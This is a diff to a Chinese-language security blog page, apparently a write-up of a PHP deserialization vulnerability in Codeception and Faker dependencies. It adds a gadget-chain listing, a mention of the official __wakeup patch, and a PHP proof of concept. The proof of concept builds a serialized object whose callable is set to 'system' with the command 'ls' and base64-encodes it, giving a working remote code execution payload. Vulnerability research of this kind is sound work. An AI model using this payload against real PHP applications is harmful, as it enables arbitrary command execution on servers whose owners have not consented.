@@ -116,18 +116,87 @@
                 
                 <div>
                 	
-                	
+                	<pre class='hljs'><code>vendor<span class="hljs-regexp">/codeception/</span>codeception<span class="hljs-regexp">/ext/</span>RunProcess.<span class="hljs-string">php:</span>:__destruct()
+
+vendor<span class="hljs-regexp">/fakerphp/</span>faker<span class="hljs-regexp">/src/</span>Faker/ValidGenerator.<span class="hljs-string">php:</span>:__call()
+
+vendor<span class="hljs-regexp">/fakerphp/</span>faker<span class="hljs-regexp">/src/</span>Faker/DefaultGenerator.<span class="hljs-string">php:</span>:__call()</code></pre>
                 	
                 </div>
                 
-                <h2 class="section-heading">构造利用链</h2>
+                <h2 class="section-heading">补丁</h2>
                 
                 <p>&nbsp;&nbsp;&nbsp;可以看到官方的补丁加了个__wakeup方法，在反序列化时触发该方法。</p>
 
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-5-19/pop-1.jpg" alt="">
                 </a>
+
+                <h2 class="section-heading">构造利用链</h2>
+
+
                 
+
+
+                <h2 class="section-heading">POC</h2>
+
+                <div>
+
+                    <pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">ValidGenerator</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span>
+</span>{
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$processes</span> = [];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;processes[] = <span class="hljs-keyword">new</span> ValidGenerator();
+    }
+}
+
+<span class="hljs-variable">$pwn</span> = <span class="hljs-keyword">new</span> RunProcess();
+<span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$pwn</span>));
+
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ValidGenerator</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$generator</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$validator</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$maxRetries</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;generator = <span class="hljs-keyword">new</span> DefaultGenerator();
+        <span class="hljs-variable">$this</span>-&gt;validator = <span class="hljs-string">"system"</span>;
+        <span class="hljs-variable">$this</span>-&gt;maxRetries=<span class="hljs-number">17</span>;
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span>)</span>
+    </span>{
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefaultGenerator</span>
+</span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$default</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$default</span> = null)</span>
+    </span>{
+        <span class="hljs-variable">$this</span>-&gt;default = <span class="hljs-string">'ls'</span>;
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span>)</span>
+    </span>{
+    }
+}</span></code></pre>
+
+                </div>
                 
 
                 <h2 class="section-heading">There Is Nothing Below</h2>
